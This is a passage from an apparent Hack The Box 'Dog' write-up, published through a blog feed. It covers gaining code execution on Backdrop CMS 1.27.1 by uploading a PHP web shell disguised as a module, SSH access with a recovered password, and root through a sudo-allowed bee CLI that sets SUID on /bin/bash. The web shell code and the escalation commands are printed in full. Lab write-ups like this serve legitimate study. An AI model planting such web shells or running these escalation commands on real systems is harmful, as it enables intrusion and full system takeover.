+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nx">input&lt;/span> &lt;span class="kd">type&lt;/span>&lt;span class="p">=&lt;/span>&lt;span class="s">&amp;#34;TEXT&amp;#34;&lt;/span> &lt;span class="nx">name&lt;/span>&lt;span class="p">=&lt;/span>&lt;span class="s">&amp;#34;cmd&amp;#34;&lt;/span> &lt;span class="nx">autofocus&lt;/span> &lt;span class="nx">id&lt;/span>&lt;span class="p">=&lt;/span>&lt;span class="s">&amp;#34;cmd&amp;#34;&lt;/span> &lt;span class="nx">size&lt;/span>&lt;span class="p">=&lt;/span>&lt;span class="s">&amp;#34;80&amp;#34;&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nx">input&lt;/span> &lt;span class="kd">type&lt;/span>&lt;span class="p">=&lt;/span>&lt;span class="s">&amp;#34;SUBMIT&amp;#34;&lt;/span> &lt;span class="nx">value&lt;/span>&lt;span class="p">=&lt;/span>&lt;span class="s">&amp;#34;Execute&amp;#34;&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">form&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nx">pre&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="err">?&lt;/span>&lt;span class="nx">php&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nf">isset&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="err">$&lt;/span>&lt;span class="nx">_GET&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="err">&amp;#39;&lt;/span>&lt;span class="nx">cmd&lt;/span>&lt;span class="err">&amp;#39;&lt;/span>&lt;span class="p">]))&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nf">system&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="err">$&lt;/span>&lt;span class="nx">_GET&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="err">&amp;#39;&lt;/span>&lt;span class="nx">cmd&lt;/span>&lt;span class="err">&amp;#39;&lt;/span>&lt;span class="p">]);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err">?&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">pre&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">body&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">html&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl">&lt;span class="err">$&lt;/span> &lt;span class="nx">cat&lt;/span> &lt;span class="nx">shell&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">info&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kd">type&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="nx">module&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">name&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="nx">Block&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">description&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="nx">Controls&lt;/span> &lt;span class="nx">the&lt;/span> &lt;span class="nx">visual&lt;/span> &lt;span class="nx">building&lt;/span> &lt;span class="nx">blocks&lt;/span> &lt;span class="nx">a&lt;/span> &lt;span class="nx">page&lt;/span> &lt;span class="nx">is&lt;/span> &lt;span class="nx">constructed&lt;/span> &lt;span class="nx">with&lt;/span>&lt;span class="p">.&lt;/span> &lt;span class="nx">Blocks&lt;/span> &lt;span class="nx">are&lt;/span> &lt;span class="nx">boxes&lt;/span> &lt;span class="nx">of&lt;/span> &lt;span class="nx">content&lt;/span> &lt;span class="nx">rendered&lt;/span> &lt;span class="nx">into&lt;/span> &lt;span class="nx">an&lt;/span> &lt;span class="nx">area&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">or&lt;/span> &lt;span class="nx">region&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">of&lt;/span> &lt;span class="nx">a&lt;/span> &lt;span class="nx">web&lt;/span> &lt;span class="nx">page&lt;/span>&lt;span class="p">.&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kn">package&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="nx">Layouts&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">tags&lt;/span>&lt;span class="p">[]&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="nx">Blocks&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">tags&lt;/span>&lt;span class="p">[]&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="nx">Site&lt;/span> &lt;span class="nx">Architecture&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">version&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="nx">BACKDROP_VERSION&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">backdrop&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="mf">1.&lt;/span>&lt;span class="nx">x&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">configure&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="nx">admin&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">structure&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">block&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">;&lt;/span> &lt;span class="nx">Added&lt;/span> &lt;span class="nx">by&lt;/span> &lt;span class="nx">Backdrop&lt;/span> &lt;span class="nx">CMS&lt;/span> &lt;span class="nx">packaging&lt;/span> &lt;span class="nx">script&lt;/span> &lt;span class="nx">on&lt;/span> &lt;span class="mi">2024&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mo">03&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mo">07&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">project&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="nx">backdrop&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">version&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="mf">1.27.1&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">timestamp&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="mi">1709862662&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl">&lt;span class="err">$&lt;/span> &lt;span class="nx">tar&lt;/span> &lt;span class="nx">cvf&lt;/span> &lt;span class="nx">shell&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">tar&lt;/span> &lt;span class="nx">shell&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">php&lt;/span> &lt;span class="nx">shell&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">info&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">shell&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">php&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">shell&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">info&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>
+&lt;img src="https://01MI.github.io/p/dog-htb-writeup-linux-easy/Backdrop_shell_tar.PNG"
+width="986"
+height="653"
+srcset="https://01MI.github.io/p/dog-htb-writeup-linux-easy/Backdrop_shell_tar_hu_162520f382904bda.PNG 480w, https://01MI.github.io/p/dog-htb-writeup-linux-easy/Backdrop_shell_tar_hu_4f8761190ad46300.PNG 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="150"
+data-flex-basis="362px"
+>
+&lt;img src="https://01MI.github.io/p/dog-htb-writeup-linux-easy/Backdrop_module_installed.PNG"
+width="500"
+height="356"
+srcset="https://01MI.github.io/p/dog-htb-writeup-linux-easy/Backdrop_module_installed_hu_caf41748980a33a1.PNG 480w, https://01MI.github.io/p/dog-htb-writeup-linux-easy/Backdrop_module_installed_hu_a0f0147f5be960fb.PNG 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="140"
+data-flex-basis="337px"
+>&lt;/p>
+&lt;p>Even if this new module is not listed in the list of installed modules, we can access it through &lt;code>/modules/shell/shell.php&lt;/code>, as specified in the &lt;a class="link" href="https://www.exploit-db.com/exploits/52021" target="_blank" rel="noopener"
+>exploit&lt;/a>.
+&lt;img src="https://01MI.github.io/p/dog-htb-writeup-linux-easy/Backdrop_RCE.PNG"
+width="836"
+height="124"
+srcset="https://01MI.github.io/p/dog-htb-writeup-linux-easy/Backdrop_RCE_hu_5d37d8ed15da13e1.PNG 480w, https://01MI.github.io/p/dog-htb-writeup-linux-easy/Backdrop_RCE_hu_63d10529c5e5d6f1.PNG 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="674"
+data-flex-basis="1618px"
+>&lt;/p>
+&lt;p>In the home directory, we can find two users, &lt;code>jobert&lt;/code> and &lt;code>johncusack&lt;/code>.
+&lt;img src="https://01MI.github.io/p/dog-htb-writeup-linux-easy/Backdrop_users.PNG"
+width="774"
+height="170"
+srcset="https://01MI.github.io/p/dog-htb-writeup-linux-easy/Backdrop_users_hu_eb4f5371c87eae46.PNG 480w, https://01MI.github.io/p/dog-htb-writeup-linux-easy/Backdrop_users_hu_9389f974789777ed.PNG 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="455"
+data-flex-basis="1092px"
+>&lt;br>
+Using the previously discovered password &lt;code>BackDropJ2024DS2024&lt;/code>, we gain SSH access to the machine as &lt;code>johncusack&lt;/code> and are able to retrieve the &lt;code>user.txt&lt;/code> flag.
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="hl">&lt;span class="lnt">1
+&lt;/span>&lt;/span>&lt;span class="hl">&lt;span class="lnt">2
+&lt;/span>&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line hl">&lt;span class="cl">&lt;span class="err">$&lt;/span> &lt;span class="nx">ssh&lt;/span> &lt;span class="nx">johncusack&lt;/span>&lt;span class="err">@&lt;/span>&lt;span class="nx">dog&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">htb&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl">&lt;span class="nx">johncusack&lt;/span>&lt;span class="err">@&lt;/span>&lt;span class="nx">dog&lt;/span>&lt;span class="p">:~&lt;/span>&lt;span class="err">$&lt;/span> &lt;span class="nx">ls&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">user&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">txt&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;/p>
+&lt;h2 id="root">Root
+&lt;/h2>&lt;h3 id="sudo-misconfiguration">Sudo misconfiguration
+&lt;/h3>&lt;p>&lt;code>Johncusack&lt;/code> can use &lt;code>bee&lt;/code> CLI as &lt;code>root&lt;/code> via sudo.
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="hl">&lt;span class="lnt">1
+&lt;/span>&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;span class="lnt">5
+&lt;/span>&lt;span class="lnt">6
+&lt;/span>&lt;span class="hl">&lt;span class="lnt">7
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line hl">&lt;span class="cl">&lt;span class="nx">johncusack&lt;/span>&lt;span class="err">@&lt;/span>&lt;span class="nx">dog&lt;/span>&lt;span class="p">:~&lt;/span>&lt;span class="err">$&lt;/span> &lt;span class="nx">sudo&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">l&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">[&lt;/span>&lt;span class="nx">sudo&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="nx">password&lt;/span> &lt;span class="k">for&lt;/span> &lt;span class="nx">johncusack&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">Matching&lt;/span> &lt;span class="nx">Defaults&lt;/span> &lt;span class="nx">entries&lt;/span> &lt;span class="k">for&lt;/span> &lt;span class="nx">johncusack&lt;/span> &lt;span class="nx">on&lt;/span> &lt;span class="nx">dog&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">env_reset&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">mail_badpass&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">secure_path&lt;/span>&lt;span class="p">=&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">usr&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">local&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">sbin&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">usr&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">local&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">bin&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">usr&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">sbin&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">usr&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">bin&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">sbin&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">bin&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">snap&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">bin&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">User&lt;/span> &lt;span class="nx">johncusack&lt;/span> &lt;span class="nx">may&lt;/span> &lt;span class="nx">run&lt;/span> &lt;span class="nx">the&lt;/span> &lt;span class="nx">following&lt;/span> &lt;span class="nx">commands&lt;/span> &lt;span class="nx">on&lt;/span> &lt;span class="nx">dog&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl"> &lt;span class="p">(&lt;/span>&lt;span class="nx">ALL&lt;/span> &lt;span class="p">:&lt;/span> &lt;span class="nx">ALL&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">/&lt;/span>&lt;span class="nx">usr&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">local&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">bin&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">bee&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;/p>
+&lt;p>This CLI &amp;ldquo;allows developers to interact with Backdrop sites&amp;rdquo; as specified on their &lt;a class="link" href="https://github.com/backdrop-contrib/bee" target="_blank" rel="noopener"
+>GitHub&lt;/a>.&lt;br>
+As we can see in the documentation, we can execute PHP code.&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="hl">&lt;span class="lnt">1
+&lt;/span>&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;span class="lnt">5
+&lt;/span>&lt;span class="lnt">6
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line hl">&lt;span class="cl">&lt;span class="nx">johncusack&lt;/span>&lt;span class="err">@&lt;/span>&lt;span class="nx">dog&lt;/span>&lt;span class="p">:~&lt;/span>&lt;span class="err">$&lt;/span> &lt;span class="nx">sudo&lt;/span> &lt;span class="nx">bee&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">...&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">eval&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">ev&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">php&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">eval&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">Evaluate&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">run&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">execute&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="nx">arbitrary&lt;/span> &lt;span class="nx">PHP&lt;/span> &lt;span class="nx">code&lt;/span> &lt;span class="nx">after&lt;/span> &lt;span class="nx">bootstrapping&lt;/span> &lt;span class="nx">Backdrop&lt;/span>&lt;span class="p">.&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">...&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>
+&lt;p>First, we are going to move to &lt;code>/var/www/html&lt;/code> so &lt;code>bee&lt;/code> can interact with our backdrop site.&lt;br>
+Then, we set the SUID flag to &lt;code>/bin/bash&lt;/code> and get a root shell in order to read the &lt;code>root.txt&lt;/code> flag.
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="hl">&lt;span class="lnt">2
+&lt;/span>&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;span class="hl">&lt;span class="lnt">5
+&lt;/span>&lt;/span>&lt;span class="hl">&lt;span class="lnt">6
+&lt;/span>&lt;/span>&lt;span class="lnt">7
+&lt;/span>&lt;span class="hl">&lt;span class="lnt">8
+&lt;/span>&lt;/span>&lt;span class="lnt">9
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">johncusack&lt;/span>&lt;span class="err">@&lt;/span>&lt;span class="nx">dog&lt;/span>&lt;span class="p">:~&lt;/span>&lt;span class="err">$&lt;/span> &lt;span class="nx">cd&lt;/span> &lt;span class="o">/&lt;/span>&lt;span class="kd">var&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">www&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">html&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl">&lt;span class="nx">johncusack&lt;/span>&lt;span class="err">@&lt;/span>&lt;span class="nx">dog&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="kd">var&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">www&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">html&lt;/span>&lt;span class="err">$&lt;/span> &lt;span class="nx">sudo&lt;/span> &lt;span class="o">/&lt;/span>&lt;span class="nx">usr&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">local&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">bin&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">bee&lt;/span> &lt;span class="nx">php&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">eval&lt;/span> &lt;span class="err">&amp;#39;&lt;/span>&lt;span class="nf">exec&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;chmod u+s /bin/bash&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="err">&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">johncusack&lt;/span>&lt;span class="err">@&lt;/span>&lt;span class="nx">dog&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="kd">var&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">www&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">html&lt;/span>&lt;span class="err">$&lt;/span> &lt;span class="nx">ls&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">l&lt;/span> &lt;span class="o">/&lt;/span>&lt;span class="nx">bin&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">bash&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">-&lt;/span>&lt;span class="nx">rwsr&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">xr&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">x&lt;/span> &lt;span class="mi">1&lt;/span> &lt;span class="nx">root&lt;/span> &lt;span class="nx">root&lt;/span> &lt;span class="mi">1183448&lt;/span> &lt;span class="nx">Apr&lt;/span> &lt;span class="mi">18&lt;/span> &lt;span class="mi">2022&lt;/span> &lt;span class="o">/&lt;/span>&lt;span class="nx">bin&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">bash&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl">&lt;span class="nx">johncusack&lt;/span>&lt;span class="err">@&lt;/span>&lt;span class="nx">dog&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="kd">var&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">www&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">html&lt;/span>&lt;span class="err">$&lt;/span> &lt;span class="o">/&lt;/span>&lt;span class="nx">bin&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">bash&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">p&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl">&lt;span class="nx">bash&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mf">5.0&lt;/span>&lt;span class="err">#&lt;/span> &lt;span class="nx">id&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">uid&lt;/span>&lt;span class="p">=&lt;/span>&lt;span class="mi">1001&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">johncusack&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="nx">gid&lt;/span>&lt;span class="p">=&lt;/span>&lt;span class="mi">1001&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">johncusack&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="nx">euid&lt;/span>&lt;span class="p">=&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">root&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="nx">groups&lt;/span>&lt;span class="p">=&lt;/span>&lt;span class="mi">1001&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">johncusack&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl">&lt;span class="nx">bash&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mf">5.0&lt;/span>&lt;span class="err">#&lt;/span> &lt;span class="nx">ls&lt;/span> &lt;span class="o">/&lt;/span>&lt;span class="nx">root&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">root&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">txt&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;/p>
+&lt;h2 id="resources">Resources
+&lt;/h2>&lt;blockquote>
+&lt;p>&lt;a class="link" href="https://github.com/lijiejie/GitHack" target="_blank" rel="noopener"
+>GitHack&lt;/a>&lt;br>
+&lt;a class="link" href="https://www.exploit-db.com/exploits/52021" target="_blank" rel="noopener"
+>RCE exploit - Backdrop v1.27.1&lt;/a>&lt;/p>&lt;/blockquote></description></item></channel></rss>
